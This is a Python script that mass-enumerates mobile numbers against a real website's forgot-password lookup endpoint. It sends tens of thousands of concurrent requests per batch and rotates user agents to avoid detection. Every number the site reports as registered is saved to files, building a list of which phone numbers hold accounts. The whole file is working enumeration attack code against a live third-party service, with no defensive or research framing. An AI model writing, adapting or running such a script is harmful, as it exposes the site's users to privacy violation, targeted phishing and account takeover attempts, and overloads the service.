import aiofiles
import asyncio
import aiohttp
import random
import csv
import os

series = ''
available_numbers = []
user_agents = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
]

headers = {
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Content-Length': '17',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'www.graceonline.in',
            'Origin': 'https://www.graceonline.in',
            'Referer': 'https://www.graceonline.in/forgot-password',
            'User-Agent': user_agents[random.randint(0, len(user_agents) - 1)],
            'X-Requested-With': 'XMLHttpRequest',
        }

async def find_numbers(session, mobile, series, loop = False):
    global headers, user_agents
    
    headers['User-Agent'] = user_agents[random.randint(0, len(user_agents) - 1)]

    try:
        async with session.post(
            url='https://www.graceonline.in/chkemailmobile',
            data={'mobile': mobile},
            headers=headers
        ) as r:
        
            res = await r.text()

            if(r.status != 200):
                # async with aiofiles.open(file=series + '_series_records.txt', mode='a') as f:
                #     await f.write(mobile + ",server error,500\n")

                print(mobile, 'Server Error', 500)
                print('Rotating number again - ' + mobile)

                if loop:
                    return mobile + ' Server Error 500'
                    
                while True:
                    print('Looping number - ' + mobile)
                    rl = await find_numbers(session, mobile, series, True)

                    if 'Registered' in rl or 'registered' in rl:
                        return rl
                        break

            if(res == '1'):
                async with aiofiles.open(file=series + '_series_records.txt', mode='a') as f:
                    await f.write(mobile + ",registered,200\n")

                    return mobile + ' Registered 200'

            async with aiofiles.open(file=series + '_series_records.txt', mode='a') as f:
                await f.write(mobile + ",not registered,200\n")
                
                return mobile + ' Not registered 200'
    except Exception as e:
        # async with aiofiles.open(file=series + '_series_records.txt', mode='a') as f:
        #     await f.write(mobile + ',Something went wrong,500\n')

        print(mobile, 'Something went wrong', 500)
        print('Rotating number again - ' + mobile)

        if loop:
            return mobile + ' Something went wrong 500'

        while True:
            print('Looping number - ' + mobile)
            rl = await find_numbers(session, mobile, series, True)

            if 'Registered' in rl or 'registered' in rl:
                return rl
                break

async def get_data(session, url):
    global series, available_numbers

    if url < 0:
        url = url * -1

    mobile = series + str(url).rjust(6, '0')

    if len(available_numbers) > 0:
        if mobile in available_numbers:
            return 'Number found already'

    return await find_numbers(session=session, mobile=mobile, series=series)

async def main():
    global series, available_numbers

    with open(file='9_series.csv', encoding='cp437', newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            if len(row['series']) == 4:
                series = str(row['series']).strip()

                isExist = os.path.exists(series + '_series_records.txt')
                if not isExist:
                    f = open(series + '_series_records.txt', 'a')
                    f.write("phone,message,status\n")
                    f.close()

                    available_numbers = []
                else:
                    with open(file=series + '_series_records.txt', encoding='cp437', newline='') as csvfile:
                        reader = csv.DictReader(csvfile)
                        reader = list(reader)

                        available_numbers = [ sub['phone'] for sub in reader ]

                initial = 0
                if len(available_numbers) > 0:
                    initial = int(available_numbers[len(available_numbers) - 1][5]) - 1
                    initial = str(initial) + '0000'

                    if int(initial) < 0:
                        initial = '00000'

                    initial = available_numbers[len(available_numbers) - 1][4:5] + initial

                    initial = int(initial)

                print('Processing numbers...')
                for i in range(initial, 1010000, 10000):
                    urls = range(i - 10000, i)
                    urls = list(urls)
                    random.shuffle(urls)

                    async with aiohttp.ClientSession() as session:
                        tasks = [asyncio.ensure_future(get_data(session, url)) for url in urls]
                        responses = await asyncio.gather(*tasks)
                        for response in responses:
                            print(response)

                    print("\n")

if __name__ == "__main__":
    import time
    s = time.perf_counter()
    asyncio.run(main())
    elapsed = time.perf_counter() - s
    print(f"{__file__} executed in {elapsed:0.2f} seconds.")